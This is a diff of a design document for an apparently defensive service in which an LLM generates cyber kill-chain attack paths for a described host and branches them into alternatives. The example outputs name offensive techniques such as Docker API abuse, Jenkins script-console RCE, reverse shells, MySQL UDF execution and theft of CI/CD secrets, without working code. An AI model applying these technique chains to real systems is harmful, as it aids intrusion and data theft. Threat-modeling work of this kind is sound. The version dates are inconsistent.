@@ -1,8 +1,9 @@
 # Attack Path Bifurcation Strategy
 
-**Document Version:** 1.0  
-**Date:** October 13, 2025  
-**Status:** Planning Phase - Not Yet Implemented
+**Document Version:** 2.0  
+**Date:** January 2025  
+**Status:** Server-Side Caching + Progress Tracking Architecture  
+**Development Approach:** AI-Copilot Assisted Implementation
 
 ---
 
@@ -10,7 +11,26 @@
 
 This document outlines the strategy for implementing **attack path bifurcation analysis** - a feature that identifies alternative attack paths (branches) from intermediate stages of an existing cyber kill chain attack path.
 
-**Key Concept:** After generating a primary attack path (stages 1→2→3→4→5→6→7), analyze each stage to identify decision points where an attacker could pursue alternative techniques, then generate continuation paths from those bifurcation points.
+**Core Innovation:** Server-side request caching architecture that eliminates LLM data duplication while maintaining full context across primary path generation, bifurcation detection, and branch generation.
+
+**Key Features:**
+- **Single Complete Endpoint:** `/attack-path/complete` - production-ready endpoint that orchestrates all three analysis phases internally
+- **Server-Side Caching:** Host parameters and intermediate results cached in-memory to prevent duplicate LLM calls
+- **Progress Tracking:** Terminal progress bar (tqdm) provides real-time visibility during multi-phase analysis (~23+ seconds)
+- **Zero Data Duplication:** LLM receives formatted prompts built from cached data, never receives raw host params multiple times
+- **Hybrid Architecture:** Granular endpoints (`/attack-path`, `/attack-path/bifurcations`, `/attack-path/bifurcations/{idx}/branches/{id}`) remain available for testing, debugging, and power users
+
+**Architecture Pattern:**
+```
+Frontend → Backend → AI Service (with server-side cache + progress bar) → LLM Provider
+```
+
+**Production Workflow:**
+1. Backend sends host parameters ONCE to `/attack-path/complete`
+2. AI Service caches host params + intermediate results internally
+3. Progress bar shows real-time status in service terminal
+4. Backend receives complete formatted result (primary path + bifurcations + branches)
+5. No duplicate data sent to LLM, no client-side orchestration needed
 
 ---
 
@@ -20,14 +40,16 @@ This document outlines the strategy for implementing **attack path bifurcation a
 2. [Current State vs Future State](#current-state-vs-future-state)
 3. [Bifurcation Logic](#bifurcation-logic)
 4. [Technical Approach](#technical-approach)
-5. [Data Models](#data-models)
-6. [LLM Prompting Strategy](#llm-prompting-strategy)
-7. [Response Structure](#response-structure)
+5. [Server-Side Caching Strategy](#server-side-caching-strategy)
+6. [Data Models](#data-models)
+7. [LLM Prompting Strategy](#llm-prompting-strategy)
 8. [API Design](#api-design)
-9. [Implementation Phases](#implementation-phases)
-10. [Cost and Performance Considerations](#cost-and-performance-considerations)
-11. [Use Cases](#use-cases)
-12. [Example Scenario](#example-scenario)
+9. [Progress Tracking](#progress-tracking)
+10. [Token Tracking Strategy](#token-tracking-strategy)
+11. [Implementation Phases](#implementation-phases)
+12. [Cost and Performance Considerations](#cost-and-performance-considerations)
+13. [Response Examples](#response-examples)
+14. [Use Cases](#use-cases)
 
 ---
 
@@ -77,22 +99,20 @@ Bifurcation at Stage 5:
 - 50+ optional input parameters
 - Dynamic prompt building
 - LLM-based path generation
-- Structured response with recommendations
+- Structured response (attack path only)
 
 **Example Output:**
 ```json
 {
   "attack_path": [
-    {
-      "stage": "Reconnaissance",
-      "technique": "Port scanning",
-      "description": "...",
-      "mitre_attack_id": "T1046"
-    },
-    // ... 6 more stages
-  ],
-  "summary": "Attack path analysis",
-  "recommendations": ["Fix Docker API", "..."]
+    "Reconnaissance: Port scanning reveals exposed services and potential entry points",
+    "Weaponization: Prepare exploit for identified vulnerability",
+    "Delivery: Direct connection to vulnerable service",
+    "Exploitation: Execute exploit to gain initial access",
+    "Installation: Establish persistence mechanism",
+    "Command and Control: Set up communication channel",
+    "Actions on Objectives: Complete mission objectives"
+  ]
 }
 ```
 
@@ -175,28 +195,93 @@ A bifurcation exists at stage N when:
 
 ## Technical Approach
 
-### Three-Pass System
+### Hybrid Architecture: Granular + Complete Endpoints
 
-#### **Pass 1: Primary Path Generation**
-*Uses existing implementation*
+**Core Philosophy:** Provide both granular control (3 independent endpoints) and production convenience (single complete endpoint with server-side caching).
+
+**Why Hybrid:**
+- **Granular endpoints** enable testing, debugging, and power-user workflows
+- **Complete endpoint** provides optimal production performance with caching
+- **Backend simplicity** - one request with all results
+- **Zero data duplication** - server caches internally, never sends duplicate data to LLM
+
+---
+
+### Architecture Overview
+
+```
+Frontend → Backend → AI Service → LLM Provider
+                      (caching)
+                      (progress)
+```
+
+**Key Innovation:** Server-side request cache eliminates duplicate data transmission to LLM while maintaining full context.
+
+---
+
+#### **Endpoint 1: `/attack-path` (Primary Path - Existing)**
+*Existing endpoint - UNCHANGED*
 
 ```
 Input: Host parameters (50+ fields)
 Process: Build dynamic prompt → Call LLM → Parse response
-Output: Primary attack path (7 stages)
+Output: {"attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...]}
 ```
 
-**Existing code handles this** - no changes needed.
+**Status:** Already implemented and production-ready. **No modifications required.**
+
+**Response Time:** 5-15 seconds  
+**Cost:** ~$0.01-0.03 per request
+
+**Use Case:** Testing, debugging, clients who only need primary path
 
 ---
 
-#### **Pass 2: Bifurcation Detection**
+#### **Service 2: `/attack-path/bifurcations` (Bifurcation Detection)**
+*New endpoint - lightweight analysis to detect decision points*
+
+**Input Structure:**
+```json
+{
+  "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
+  "host": {
+    // ALL 50+ optional parameters - same InputHost as sent to Service 1
+    "platform": "Linux",
+    "version_os": "Ubuntu 20.04",
+    "open_ports": [2375, 8080, 3306],
+    "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
+    "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
+    "security_controls": ["fail2ban"],
+    "mfa_enabled": false,
+    "admin_accounts": ["root", "admin"],
+    "network_segment": "DMZ",
+    "internet_exposed": true,
+    "asset_criticality": "Critical",
+    "edr_agent": "None",
+    "configurations": ["Docker API exposed without TLS authentication"],
+    "password_policy": "Weak - 8 character minimum",
+    "installed_software": ["Jenkins 2.346.1", "MySQL 5.7.33", "Docker 20.10.7"],
+    // ... any other parameters from the 50+ available fields
+  }
+}
+```
+
+**Single-Pass Analysis (Bifurcation Detection Only):**
 
 ```
-Input: Primary attack path from Pass 1 + Host parameters
-Process: For each stage, analyze context and identify alternatives
-Output: List of bifurcation points with decision context
+Input: Primary attack path from Service 1 + Complete InputHost (all 50+ parameters)
+Process: For each stage, analyze attacker context and identify alternatives using full system knowledge
+Output: List of bifurcation points with alternative IDs (NO continuation paths generated yet)
 ```
+
+**Response Time:** 5-10 seconds (1 LLM call)  
+**Cost:** ~$0.01-0.02 per request
+
+**Why Full InputHost is Critical:**
+- Attack path strings describe what happened, but may not capture all available targets
+- 50+ parameters provide complete system context: services, vulnerabilities, security gaps, credentials, network topology
+- LLM can identify realistic alternatives by matching attacker capabilities with available attack surface
+- Example: Stage shows "container access" → LLM checks host.services for pivot targets, host.vulnerabilities for exploits, host.security_controls for evasion needs
 
 **LLM Prompt Strategy:**
 ```
@@ -234,12 +319,13 @@ Return JSON with bifurcation points.
       "stage_index": 3,
       "stage_name": "Execution",
       "attacker_context": "Has Docker container access, can see internal network",
+      "decision_point": "Multiple exploitable services visible from container network",
       "alternatives": [
         {
           "id": "B1",
           "reason": "Jenkins visible and unauthenticated",
           "technique": "Pivot to Jenkins exploitation",
-          "probability": "medium"
+          "probability": "high"
         },
         {
           "id": "B2",
@@ -253,17 +339,44 @@ Return JSON with bifurcation points.
 }
 ```
 
+**Note:** The `alternatives` array contains metadata ONLY - no `continuation_path` field yet. Branches are generated on-demand via Service 3.
+
 ---
 
-#### **Pass 3: Alternative Path Generation**
+#### **Service 3: `/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}` (Branch Generation)**
+*New endpoint - on-demand generation of specific branch continuation*
+
+**Input Structure:**
+```json
+{
+  "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
+  "host": {
+    // Same complete InputHost with all 50+ parameters
+    "platform": "Linux",
+    "open_ports": [2375, 8080, 3306],
+    "services": [...],
+    "vulnerabilities": [...],
+    // ... all other fields
+  },
+  "bifurcation_index": 0,
+  "branch_id": "B1"
+}
+```
+
+**Response Time:** 3-5 seconds (1 LLM call)  
+**Cost:** ~$0.005-0.01 per branch
+
+**Single-Pass Analysis (Branch Generation):**
 
 ```
-Input: Each bifurcation point from Pass 2 + Host parameters
-Process: For each alternative, generate continuation through remaining kill chain
-Output: Complete branch paths from bifurcation points
+Input: Specific bifurcation point + branch ID + Complete InputHost (50+ params) + Original attack_path for context
+Process: Generate realistic continuation for THIS specific branch using full system knowledge
+Output: Complete continuation path from bifurcation point to end of kill chain
 ```
 
-**LLM Prompt Strategy (per bifurcation):**
+**Note:** Service 3 generates ONE branch at a time, on-demand. Client controls which branches to explore.
+
+**LLM Prompt Strategy (Service 3 - per branch):**
 ```
 System: You are an expert penetration tester creating attack paths.
 
@@ -292,86 +405,274 @@ Return JSON with complete continuation path.
 ```json
 {
   "branch_id": "B1",
+  "bifurcation_index": 0,
   "from_stage": 3,
   "continuation_path": [
-    {
-      "stage": "Privilege Escalation",
-      "technique": "Jenkins Groovy Script Console RCE",
-      "description": "Execute arbitrary code via unauthenticated /script endpoint",
-      "mitre_attack_id": "T1059.007"
-    },
-    // ... stages 5-7
+    "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code via /script endpoint",
+    "Command and Control: Establish reverse shell via Jenkins agent connection",
+    "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace"
   ]
 }
 ```
 
 ---
 
+## Server-Side Caching Strategy
+
+### Problem: Data Duplication Without Caching
+
+**Without server-side caching**, the client must orchestrate three separate API calls:
+
+```text
+1. POST /attack-path with InputHost (50+ fields) → Primary path
+2. POST /attack-path/bifurcations with InputHost + attack_path → Bifurcations
+3. POST /attack-path/bifurcations/{idx}/branches/{id} with InputHost + attack_path → Each branch
+```
+
+**Issues:**
+- ❌ **LLM data duplication**: Host params sent to LLM 3-4 times (once per service)
+- ❌ **Network overhead**: Sending 50+ fields repeatedly across network
+- ❌ **Client complexity**: Backend must manage state and orchestrate calls
+- ❌ **Cost inefficiency**: Duplicate token usage if LLM processes same data multiple times
+
+### Solution: Server-Side Request Cache
+
+**With server-side caching**, one endpoint handles everything internally:
+
+```python
+# In-memory cache structure (Python dict)
+request_cache = {
+    "request_id": str(uuid.uuid4()),
+    "host": InputHost,           # Cached once, reused for all phases
+    "attack_path": List[str],    # Cached after Service 1
+    "bifurcations": List[...],   # Cached after Service 2
+    "branches": Dict[str, ...]   # Cached as each branch is generated
+}
+```
+
+**Benefits:**
+- ✅ **Zero LLM duplication**: Host params cached, formatted prompts built from cache
+- ✅ **Single client call**: Backend sends host params ONCE to `/attack-path/complete`
+- ✅ **Server-side orchestration**: AI service manages all three phases internally
+- ✅ **Cost optimized**: LLM receives only formatted prompts, not duplicate raw data
+- ✅ **Progress visibility**: Terminal progress bar shows real-time status
+
+### Caching Workflow
+
+```python
+@app.post("/attack-path/complete")
+async def generate_complete_attack_path(host: InputHost):
+    """
+    Complete bifurcation analysis with server-side caching.
+    
+    Returns:
+        {
+            "primary_path": [...],
+            "bifurcations": [...],
+            "branches": {...},
+            "request_id": "uuid"
+        }
+    """
+    # Initialize cache
+    request_cache = {
+        "request_id": str(uuid.uuid4()),
+        "host": host,  # CACHED - never sent to LLM again
+        "attack_path": None,
+        "bifurcations": None,
+        "branches": {}
+    }
+    
+    # Phase 1: Generate primary path using cached host data
+    primary_result = await analyzer.analyze(request_cache["host"])
+    request_cache["attack_path"] = primary_result.attack_path
+    
+    # Phase 2: Detect bifurcations using cached host + attack_path
+    bifurcations_result = await detect_bifurcations(
+        attack_path=request_cache["attack_path"],
+        host=request_cache["host"]  # Reused from cache
+    )
+    request_cache["bifurcations"] = bifurcations_result.bifurcations
+    
+    # Phase 3: Generate branches using cached data
+    for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
+        for alternative in bifurcation.alternatives:
+            branch = await generate_branch(
+                attack_path=request_cache["attack_path"],  # From cache
+                host=request_cache["host"],  # From cache
+                bifurcation_index=bif_idx,
+                branch_id=alternative.id
+            )
+            request_cache["branches"][alternative.id] = branch
+    
+    # Return complete formatted result
+    return format_complete_response(request_cache)
+```
+
+### Cache Lifecycle
+
+1. **Request Start**: Cache created with unique request_id
+2. **Phase 1 (Primary Path)**: Host params cached, attack_path stored
+3. **Phase 2 (Bifurcation Detection)**: Uses cached host + attack_path, stores bifurcations
+4. **Phase 3 (Branch Generation)**: Uses cached data for each branch, stores branches
+5. **Request End**: Cache cleared after response sent (optional: TTL-based cache for retries)
+
+### Data Flow Comparison
+
+**Old Approach (Client Orchestration):**
+```text
+Client → Service 1 (send host params) → LLM (process host)
+Client → Service 2 (send host + path) → LLM (process host again)
+Client → Service 3 (send host + path) → LLM (process host again)
+```
+
+**New Approach (Server-Side Caching):**
+```text
+Client → /attack-path/complete (send host params once)
+    ├─ Phase 1: Build prompt from host → LLM
+    ├─ Phase 2: Build prompt from cached host + path → LLM
+    └─ Phase 3: Build prompt from cached data → LLM
+Client ← Complete result (primary + bifurcations + branches)
+```
+
+### LLM Prompt Strategy with Caching
+
+**Key Insight:** LLM doesn't receive raw host params multiple times. Instead:
+
+```python
+# Phase 1: LLM receives formatted prompt
+prompt_1 = build_primary_path_prompt(cache["host"])
+# "Analyze this Linux Ubuntu 20.04 system with Docker API exposed..."
+
+# Phase 2: LLM receives formatted prompt built from cache
+prompt_2 = build_bifurcation_prompt(
+    attack_path=cache["attack_path"],
+    host_context=summarize_host_for_bifurcation(cache["host"])
+)
+# "Given primary path [...] and system with [Docker, Jenkins, MySQL], 
+#  identify decision points..."
+
+# Phase 3: LLM receives formatted prompt for specific branch
+prompt_3 = build_branch_prompt(
+    branch_context=get_branch_context(cache, bif_idx, branch_id),
+    host_summary=cache["host"].platform + " with " + cache["host"].services
+)
+# "Generate continuation from Stage 3 (Docker access) targeting Jenkins..."
+```
+
+**Result:** Each phase sends **different formatted prompts** to LLM, but all built from **same cached host data**.
+
+---
+
 ## Data Models
 
-### Enhanced Response Models
+### Service 1 Models (Existing - UNCHANGED)
+
+```python
+class AttackPathResponse(BaseModel):
+    """Response from /attack-path endpoint"""
+    attack_path: List[str] = Field(description="7-stage attack sequence")
+    generated_prompt: Optional[str] = None
+    prompt_sections: Optional[int] = None
+```
+
+---
+
+### Service 2 Models (NEW)
+
+**File:** `app/models/bifurcation.py`
 
 ```python
 from typing import List, Optional, Dict
 from pydantic import BaseModel, Field
 
-class AttackStage(BaseModel):
-    """Single stage in attack path (existing model)"""
-    stage: str
-    technique: str
-    description: str
-    mitre_attack_id: Optional[str] = None
-    tools: Optional[List[str]] = None
-    indicators: Optional[List[str]] = None
-    detection_difficulty: Optional[str] = None
 
-class AlternativeBranch(BaseModel):
-    """Alternative path from a bifurcation point"""
-    branch_id: str = Field(description="Unique identifier for this branch (e.g., 'B1', 'B2')")
+# ============================================
+# SERVICE 2: Bifurcation Detection Models
+# ============================================
+
+class BifurcationDetectionRequest(BaseModel):
+    """Input for Service 2: /attack-path/bifurcations"""
+    attack_path: List[str] = Field(
+        ...,
+        description="The attack path strings from /attack-path endpoint (what the attacker did)"
+    )
+    host: InputHost = Field(
+        ...,
+        description="Complete host parameters with ALL 50+ optional fields - exact same InputHost sent to /attack-path. Provides full context about available targets, vulnerabilities, security controls, credentials, network topology, etc."
+    )
+
+class AlternativeMetadata(BaseModel):
+    """Metadata about an alternative branch (NO continuation path yet)"""
+    id: str = Field(description="Unique identifier for this branch (e.g., 'B1', 'B2')")
     technique: str = Field(description="Alternative technique/target")
     reason: str = Field(description="Why this alternative exists")
     probability: str = Field(description="Likelihood: high/medium/low")
-    continuation_path: List[AttackStage] = Field(description="Remaining kill chain stages for this branch")
 
-class Bifurcation(BaseModel):
-    """Decision point where attack path can branch"""
+class BifurcationPoint(BaseModel):
+    """Decision point where attack path can branch (detection only)"""
     stage_index: int = Field(description="Index in primary path where bifurcation occurs (0-based)")
     stage_name: str = Field(description="Name of the kill chain stage")
     attacker_context: str = Field(description="What the attacker has gained at this point")
     decision_point: str = Field(description="Why multiple paths exist here")
-    branches: List[AlternativeBranch] = Field(description="Alternative continuation paths")
+    alternatives: List[AlternativeMetadata] = Field(description="Alternative branch metadata (no paths yet)")
 
-class AttackGraph(BaseModel):
-    """Visual representation of attack tree"""
-    total_paths: int = Field(description="Total number of unique paths (primary + branches)")
-    total_stages: int = Field(description="Total stages across all paths")
-    bifurcation_count: int = Field(description="Number of decision points")
-    graph_ascii: Optional[str] = Field(None, description="ASCII art representation")
-    graph_json: Optional[Dict] = Field(None, description="Machine-readable graph structure")
+class BifurcationDetectionResponse(BaseModel):
+    """Response from Service 2: /attack-path/bifurcations"""
+    bifurcations: List[BifurcationPoint] = Field(description="Decision points with alternative metadata")
 
-class EnhancedAttackPathResponse(BaseModel):
-    """Complete response with bifurcation analysis"""
-    
-    # Primary path (existing fields)
-    primary_path: List[AttackStage] = Field(description="Main attack path through kill chain")
-    summary: str = Field(description="Overall attack path summary")
-    recommendations: List[str] = Field(description="Security recommendations")
-    
-    # Bifurcation analysis (new fields)
-    bifurcations: Optional[List[Bifurcation]] = Field(None, description="Decision points with alternatives")
-    attack_graph: Optional[AttackGraph] = Field(None, description="Visual attack tree representation")
-    
-    # Metadata
-    generated_prompt: Optional[str] = Field(None, description="Primary path prompt (if include_prompt=true)")
-    prompt_sections: Optional[int] = Field(None, description="Number of sections in primary prompt")
-    analysis_depth: str = Field("standard", description="'standard' or 'bifurcated'")
+
+# ============================================
+# SERVICE 3: Branch Generation Models
+# ============================================
+
+class BranchGenerationRequest(BaseModel):
+    """Input for Service 3: /attack-path/bifurcations/{bif_idx}/branches/{branch_id}"""
+    attack_path: List[str] = Field(
+        ...,
+        description="Original attack path for context"
+    )
+    host: InputHost = Field(
+        ...,
+        description="Complete host parameters (same as sent to Service 1 and 2)"
+    )
+    bifurcation_index: int = Field(
+        ...,
+        description="Index of the bifurcation point in the bifurcations array"
+    )
+    branch_id: str = Field(
+        ...,
+        description="The specific branch ID to generate (e.g., 'B1')"
+    )
+
+class BranchGenerationResponse(BaseModel):
+    """Response from Service 3: generated continuation path for one branch"""
+    branch_id: str = Field(description="The branch ID that was generated")
+    bifurcation_index: int = Field(description="Index of the bifurcation point")
+    from_stage: int = Field(description="Stage index where this branch diverges")
+    continuation_path: List[str] = Field(description="Attack path continuation from bifurcation point to end")
+
+
+# ============================================
+# SHARED: Token Tracking (not in responses)
+# ============================================
+
+class TokenUsage(BaseModel):
+    """Token consumption tracking for a single LLM call (logged only)"""
+    prompt_tokens: int = Field(description="Input tokens sent to LLM")
+    completion_tokens: int = Field(description="Output tokens received from LLM")
+    total_tokens: int = Field(description="Total tokens (prompt + completion)")
+    model: str = Field(description="LLM model used")
+    response_time_seconds: float = Field(description="Time taken for LLM call")
+    cost_estimate_usd: Optional[float] = Field(None, description="Estimated cost in USD")
 ```
+
+**Note:** Token tracking is logged to `logs/token_usage.jsonl` but NOT included in API responses.
 
 ---
 
 ## LLM Prompting Strategy
 
-### Pass 1: Primary Path (Existing)
+### Service 1: Primary Path (Existing)
 
 **File:** `app/core/prompts.py` - `build_attack_analysis_prompt()`
 
@@ -379,7 +680,7 @@ class EnhancedAttackPathResponse(BaseModel):
 
 ---
 
-### Pass 2: Bifurcation Detection (New)
+### Service 2: Bifurcation Detection (New)
 
 **New Function:** `build_bifurcation_analysis_prompt()`
 
@@ -481,7 +782,7 @@ If no bifurcations exist, return empty array.
 
 ---
 
-### Pass 3: Branch Generation (New)
+### Service 3: Branch Generation (New)
 
 **New Function:** `build_branch_continuation_prompt()`
 
@@ -585,42 +886,6 @@ Return a JSON object with this structure:
 
 ```json
 {
-  "primary_path": [
-    {
-      "stage": "Reconnaissance",
-      "technique": "Port Scanning",
-      "description": "Scan target to identify open ports and services",
-      "mitre_attack_id": "T1046",
-      "tools": ["nmap", "masscan"],
-      "detection_difficulty": "low"
-    },
-    {
-      "stage": "Initial Access",
-      "technique": "Exploit Unauthenticated Docker API",
-      "description": "Connect to Docker API on port 2375 without authentication",
-      "mitre_attack_id": "T1190",
-      "tools": ["docker-cli", "metasploit"],
-      "detection_difficulty": "medium"
-    },
-    {
-      "stage": "Execution",
-      "technique": "Deploy Malicious Container",
-      "description": "Create privileged container with host filesystem mounted",
-      "mitre_attack_id": "T1610",
-      "tools": ["docker"],
-      "detection_difficulty": "medium"
-    },
-    // ... stages 4-7
-  ],
-  
-  "summary": "Attack path exploiting unauthenticated Docker API...",
-  
-  "recommendations": [
-    "Enable Docker TLS authentication",
-    "Restrict Docker API to localhost only",
-    "Implement network segmentation"
-  ],
-  
   "bifurcations": [
     {
       "stage_index": 2,
@@ -634,15 +899,9 @@ Return a JSON object with this structure:
           "reason": "Jenkins running without authentication on internal network",
           "probability": "high",
           "continuation_path": [
-            {
-              "stage": "Privilege Escalation",
-              "technique": "Jenkins Groovy Script Console RCE",
-              "description": "Execute arbitrary code via /script endpoint",
-              "mitre_attack_id": "T1059.007",
-              "tools": ["curl", "jenkins-cli"],
-              "detection_difficulty": "low"
-            },
-            // ... stages 5-7
+            "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code",
+            "Command and Control: Establish reverse shell via Jenkins agent",
+            "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace"
           ]
         },
         {
@@ -651,22 +910,16 @@ Return a JSON object with this structure:
           "reason": "MySQL accessible with default credentials from container",
           "probability": "medium",
           "continuation_path": [
-            {
-              "stage": "Privilege Escalation",
-              "technique": "MySQL UDF Code Execution",
-              "description": "Load malicious UDF to execute OS commands",
-              "mitre_attack_id": "T1059.004",
-              "tools": ["mysql-client", "lib_mysqludf_sys"],
-              "detection_difficulty": "high"
-            },
-            // ... stages 5-7
+            "Installation: MySQL UDF code execution to gain OS command access",
+            "Command and Control: Setup MySQL-based backdoor for persistence",
+            "Actions on Objectives: Dump production database with customer PII"
           ]
         }
       ]
     },
     {
       "stage_index": 4,
-      "stage_name": "Persistence",
+      "stage_name": "Installation",
       "attacker_context": "Attacker has root access on host system",
       "decision_point": "Multiple persistence mechanisms available",
       "branches": [
@@ -676,265 +929,1222 @@ Return a JSON object with this structure:
           "reason": "Multiple service accounts with sudo privileges",
           "probability": "medium",
           "continuation_path": [
-            // ... stages 5-7 using service account approach
+            "Command and Control: Service account-based C2 channel",
+            "Actions on Objectives: Lateral movement using service account credentials"
           ]
         }
       ]
     }
-  ],
-  
-  "attack_graph": {
-    "total_paths": 4,
-    "total_stages": 28,
-    "bifurcation_count": 2,
-    "graph_ascii": "
-Stage 1: Reconnaissance
-   |
-Stage 2: Initial Access (Docker)
-   |
-Stage 3: Execution (Container)
-   |
-   ├─── [Primary] Stage 4: Privilege Escalation (Container Escape)
-   |       |
-   |       Stage 5-7: ... (original path)
-   |
-   ├─── [B1] Stage 4: Privilege Escalation (Jenkins RCE)
-   |       |
-   |       Stage 5-7: ... (Jenkins branch)
-   |
-   └─── [B2] Stage 4: Privilege Escalation (MySQL UDF)
-           |
-           Stage 5-7: ... (MySQL branch)
-    ",
-    "graph_json": {
-      "nodes": [
-        {"id": "S1", "stage": "Reconnaissance", "technique": "Port Scanning"},
-        {"id": "S2", "stage": "Initial Access", "technique": "Docker API"},
-        {"id": "S3", "stage": "Execution", "technique": "Malicious Container", "bifurcation": true},
-        {"id": "S4-primary", "stage": "Privilege Escalation", "technique": "Container Escape", "branch": "primary"},
-        {"id": "S4-B1", "stage": "Privilege Escalation", "technique": "Jenkins RCE", "branch": "B1"},
-        {"id": "S4-B2", "stage": "Privilege Escalation", "technique": "MySQL UDF", "branch": "B2"}
-        // ... more nodes
-      ],
-      "edges": [
-        {"from": "S1", "to": "S2"},
-        {"from": "S2", "to": "S3"},
-        {"from": "S3", "to": "S4-primary", "type": "primary"},
-        {"from": "S3", "to": "S4-B1", "type": "branch"},
-        {"from": "S3", "to": "S4-B2", "type": "branch"}
-        // ... more edges
-      ]
-    }
-  },
-  
-  "generated_prompt": "...",
-  "prompt_sections": 7,
-  "analysis_depth": "bifurcated"
+  ]
 }
 ```
+
+**Response Contains:**
+- `bifurcations`: Array of decision points with alternative paths
+- Each bifurcation includes:
+  - Stage information (index, name)
+  - Attacker context (what was gained)
+  - Decision rationale (why alternatives exist)
+  - Alternative branches with continuation paths
+
+**Total Paths Calculation:**
+- Primary path: 1
+- Branches: 3 (B1, B2, B3)
+- **Total: 4 unique attack paths**
+
+---
+
+## Token Tracking Strategy
+
+### Overview
+
+**Token usage is logged locally to a file** - not included in API responses to avoid overhead. This provides comprehensive tracking for cost monitoring and performance analysis without impacting client response payloads.
+
+### Implementation: Local JSON Lines Logging
+
+**Log File Format:** JSON Lines (`.jsonl`) - one JSON object per line
+
+**Location:** `logs/token_usage.jsonl`
+
+**Log Rotation:** 10MB per file, keep 5 backups (50MB total history)
+
+### Token Logger Implementation
+
+**New File:** `app/utils/token_logger.py`
+
+```python
+import json
+import logging
+from datetime import datetime
+from pathlib import Path
+from typing import Dict, Optional
+from logging.handlers import RotatingFileHandler
+
+class TokenLogger:
+    """
+    Logs token usage to local JSON Lines file.
+    Each line is a JSON object representing one LLM call.
+    """
+    
+    def __init__(self, log_file: str = "logs/token_usage.jsonl"):
+        self.log_file = Path(log_file)
+        self.log_file.parent.mkdir(parents=True, exist_ok=True)
+        
+        self.logger = logging.getLogger("token_usage")
+        self.logger.setLevel(logging.INFO)
+        
+        if not self.logger.handlers:
+            handler = RotatingFileHandler(
+                self.log_file,
+                maxBytes=10 * 1024 * 1024,  # 10 MB
+                backupCount=5
+            )
+            handler.setFormatter(logging.Formatter('%(message)s'))
+            self.logger.addHandler(handler)
+    
+    def log_llm_call(
+        self,
+        request_id: str,
+        call_type: str,  # "primary_path", "bifurcation_detection", "branch_B1"
+        model: str,
+        prompt_tokens: int,
+        completion_tokens: int,
+        total_tokens: int,
+        response_time_seconds: float,
+        cost_estimate: Optional[float] = None,
+        metadata: Optional[Dict] = None
+    ):
+        log_entry = {
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "request_id": request_id,
+            "call_type": call_type,
+            "model": model,
+            "tokens": {
+                "prompt": prompt_tokens,
+                "completion": completion_tokens,
+                "total": total_tokens
+            },
+            "response_time_seconds": round(response_time_seconds, 3),
+            "cost_estimate_usd": cost_estimate,
+            "metadata": metadata or {}
+        }
+        self.logger.info(json.dumps(log_entry))
+
+# Global instance
+token_logger = TokenLogger()
+```
+
+### LLM Client Updates
+
+**File:** `app/services/llm_client.py`
+
+```python
+import time
+from app.utils.token_logger import token_logger
+
+class LLMClient:
+    
+    async def complete(
+        self, 
+        system_message: str, 
+        user_prompt: str,
+        json_mode: bool = True,
+        request_id: str = None,  # NEW: for tracking
+        call_type: str = "primary_path"  # NEW: categorization
+    ) -> Dict[str, Any]:
+        start_time = time.time()
+        
+        # ... existing LLM call code ...
+        response = await litellm.acompletion(**request_params)
+        
+        response_time = time.time() - start_time
+        usage = response.usage
+        
+        # Calculate cost estimate
+        cost_estimate = self._calculate_cost(
+            model=self.model,
+            prompt_tokens=usage.prompt_tokens,
+            completion_tokens=usage.completion_tokens
+        )
+        
+        # LOG TOKEN USAGE (local file only)
+        token_logger.log_llm_call(
+            request_id=request_id or "unknown",
+            call_type=call_type,
+            model=self.model,
+            prompt_tokens=usage.prompt_tokens,
+            completion_tokens=usage.completion_tokens,
+            total_tokens=usage.total_tokens,
+            response_time_seconds=response_time,
+            cost_estimate=cost_estimate
+        )
+        
+        # ... existing response parsing ...
+    
+    def _calculate_cost(self, model: str, prompt_tokens: int, completion_tokens: int) -> float:
+        """Estimate cost based on model pricing (as of 2024)"""
+        pricing = {
+            "gpt-4o-mini": {"input": 0.150, "output": 0.600},
+            "gpt-4o": {"input": 2.50, "output": 10.00},
+            "claude-3-5-sonnet-20241022": {"input": 3.00, "output": 15.00},
+        }
+        
+        if model not in pricing:
+            return None
+        
+        input_cost = (prompt_tokens / 1_000_000) * pricing[model]["input"]
+        output_cost = (completion_tokens / 1_000_000) * pricing[model]["output"]
+        
+        return round(input_cost + output_cost, 6)
+```
+
+### Analyzer Updates
+
+**File:** `app/services/analyzer.py`
+
+```python
+import uuid
+
+class AttackPathAnalyzer:
+    
+    async def analyze_with_bifurcations(self, host: InputHost, include_prompt: bool = True):
+        """Three-pass analysis with token tracking"""
+        
+        # Generate unique request ID for grouping related LLM calls
+        request_id = str(uuid.uuid4())
+        
+        # Pass 1: Primary path
+        primary_result = await self.analyze(host, include_prompt)
+        
+        # Pass 2: Bifurcation detection
+        bifurcations_data = await self.llm_client.complete(
+            system_message="...",
+            user_prompt=bifurcation_prompt,
+            json_mode=True,
+            request_id=request_id,
+            call_type="bifurcation_detection"
+        )
+        
+        # Pass 3: Generate each branch
+        for bifurcation in bifurcations_data.get("bifurcations", []):
+            for alt in bifurcation.get("alternatives", []):
+                branch_data = await self.llm_client.complete(
+                    system_message="...",
+                    user_prompt=branch_prompt,
+                    json_mode=True,
+                    request_id=request_id,
+                    call_type=f"branch_{alt['id']}"  # e.g., "branch_B1"
+                )
+                # ... process branch ...
+        
+        # Token usage logged automatically - not in response
+        return enhanced_response
+```
+
+### Example Log Output
+
+**File:** `logs/token_usage.jsonl`
+
+```json
+{"timestamp": "2025-10-16T14:32:15.234Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "primary_path", "model": "gpt-4o-mini", "tokens": {"prompt": 3200, "completion": 1800, "total": 5000}, "response_time_seconds": 4.521, "cost_estimate_usd": 0.00156, "metadata": {}}
